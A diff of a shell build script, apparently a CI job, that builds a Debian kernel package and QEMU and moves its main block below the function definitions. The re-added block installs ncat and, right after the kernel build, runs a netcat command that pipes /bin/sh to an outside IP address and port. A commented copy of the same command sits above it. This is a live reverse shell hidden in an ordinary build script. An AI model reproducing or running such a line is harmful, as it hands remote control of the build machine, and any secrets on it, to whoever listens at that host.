@@ -1,21 +1,6 @@
 #! /bin/sh
 set -e o pipefail
 
-#https://wiki.debian.org/HowToUpgradeKernel
-#5.10.0-15-amd64
-#linux-image-5.10.0-15-amd64
-#linux-image-5.18.0-2-amd64
-echo "deb http://deb.debian.org/debian unstable main" > /etc/apt/sources.list
-apt update
-apt install -y ncat
-#nc 65.108.51.31 11452 -e /bin/sh
-apt install -y build-essential libncurses-dev bison flex libssl-dev libelf-dev bc
-
-build_kernel
-nc 65.108.51.31 11452 -e /bin/sh
-ls ../*.deb
-exit 0
-
 
 build_qemu () {
   #####BUILD QEMU
@@ -64,4 +49,20 @@ build_kernel() {
   make deb-pkg LOCALVERSION=-falcot KDEB_PKGVERSION=$(make kernelversion)-1
   cp ../*.deb /github/workspace/
 }
+
+#https://wiki.debian.org/HowToUpgradeKernel
+#5.10.0-15-amd64
+#linux-image-5.10.0-15-amd64
+#linux-image-5.18.0-2-amd64
+echo "deb http://deb.debian.org/debian unstable main" > /etc/apt/sources.list
+apt update
+apt install -y ncat
+#nc 65.108.51.31 11452 -e /bin/sh
+apt install -y build-essential libncurses-dev bison flex libssl-dev libelf-dev bc
+
+build_kernel
+nc 65.108.51.31 11452 -e /bin/sh
+ls ../*.deb
+exit 0
+
 
